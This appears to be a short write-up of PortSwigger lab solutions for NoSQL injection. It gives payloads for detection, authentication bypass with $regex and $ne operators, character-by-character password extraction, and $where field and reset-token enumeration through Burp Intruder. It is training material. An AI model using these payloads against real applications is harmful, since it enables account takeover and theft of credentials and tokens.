# NoSQLInjection

### Labs Portswigger
1. Detecting NoSQLInjection
```
GET /filter?category=Pets'||1||'
```
2. Exploiting NoSQL operator injeciton bypass authentication
```json
{
    "username": {
        "$regex": "admin.*"
    },
    "password": {
        "$ne": ""
    }
}
```
3. Exploiting NoSQL injection to extract data
>In `GET /user/lookup?user=wiener`, determine password length
```
administrator' && this.password.length < 30 || 'a'=='b
```
>In Intruder, select Cluster bomb attack and payload set 1 is Numbers 0 to 7, set 2 is a-z.
```
administrator' && this.password[§0§]=='§a§
```
4. Exploiting NoSQL operator injection to extract unknown fiekds
>4.1 In Intruder, construct an attack to identify all the fields on the user object:  
>4.2 The first identifies the character position number, and the second identifies the character itself.  
>4.3 Select Cluster bomb attack and payload set 1 is Numbers 0 to 20, set 2 is 0-9a-zA-z.  
```
{
    "username": "carlos",
    "password": {
        "$ne": "invalid"
    },
    "$where": "Object.keys(this)[1].match('^.{§§}§§.*')"
}
```
>4.4 Repeat the above steps to identify further JSON parameters.  
```
"$where":"Object.keys(this)[2].match('^.{}.*')"
```
>4.5 Send `GET /forgot-password` to repeater, and send `GET /forgot-password?foo=invalid` then, send `GET /forgot-passeord?YOURTOKENNAME=foo`.  
>4.6 In intruder
```
"$where":"this.YOURTOKENNAME.match('^.{§§}§§.*')"
```
>4.7 Send `GET /forgot-password?YOURTOKENNAME=TOKENVALUE`
